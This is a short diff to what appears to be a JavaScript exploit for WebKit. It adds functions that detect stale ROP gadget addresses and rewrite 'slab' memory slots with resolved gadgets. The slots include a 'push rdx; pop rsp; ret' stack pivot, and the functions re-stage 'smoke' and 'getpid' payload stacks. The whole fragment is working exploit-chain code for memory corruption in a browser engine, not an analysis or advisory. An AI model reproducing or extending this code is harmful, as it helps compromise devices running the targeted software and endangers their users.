@@ -317,6 +317,55 @@ function pivotHookCell(prep, off) {
     return prep.pivotCell.add32(hookOff);
 }
 
+/** True when prep was built @ Start with old pivot RVAs (slab still has stale G1-G5). */
+export function prepGadgetRvaStale(prep, off) {
+    if (!prep || !prep.G || !prep.webkitBase || !off) return true;
+    const wb = prep.webkitBase;
+    const keys = [
+        ["G0", "wk_MOV_RDI_RSI_30_CALL"],
+        ["G5", "wk_PUSH_RDX_POP_RSP_RET"],
+    ];
+    for (let i = 0; i < keys.length; i++) {
+        const nm = keys[i][0];
+        const key = keys[i][1];
+        const rva = off[key];
+        if (rva == null || !prep.G[nm]) continue;
+        const want = wb.add32(rva);
+        if (String(prep.G[nm]) !== String(want)) return true;
+    }
+    return false;
+}
+
+/** Rewrite slab store/pivot slots from current offset table (no new ArrayBuffers). */
+export function refreshPrepSlabGadgets(prep, off, webkitBase) {
+    if (!prep || !prep.M || !off || !webkitBase)
+        throw new Error("refreshPrepSlabGadgets: bad args");
+    const resolved = resolveGadgetsTrust(webkitBase, off);
+    if (!resolved.G || resolved.bad.length)
+        throw new Error("refreshPrepSlabGadgets: " + resolved.bad.join(","));
+    const stale = prepGadgetRvaStale(prep, off);
+    prep.G = resolved.G;
+    const G = prep.G;
+    const M = prep.M;
+    put(M.storeDv, 0x00, G.G1);
+    put(M.storeDv, 0x08, M.P);
+    put(M.storeDv, 0x10, G.G3);
+    put(M.storeDv, 0x18, G.G2);
+    put(M.pivotDv, 0x00, M.P);
+    put(M.pivotDv, 0x10, G.G5);
+    put(M.pivotDv, 0x20, G.G4);
+    if (prep.staged) {
+        if (prep.stagedKind === "smoke")
+            layoutSmokeStack(prep);
+        else if (prep.stagedKind === "getpid" && prep.stubOff != null
+            && prep._layout && prep.M && prep.G) {
+            /* stub addr re-staged by caller if lk known */
+        }
+    }
+    prep._staleRefreshed = stale;
+    return stale;
+}
+
 /** Can primitive read slab backing addrs (bad bufAddr → OOM @ G5). */
 export function verifySlabAddrs(p, prep) {
     if (!prep || !prep.M)
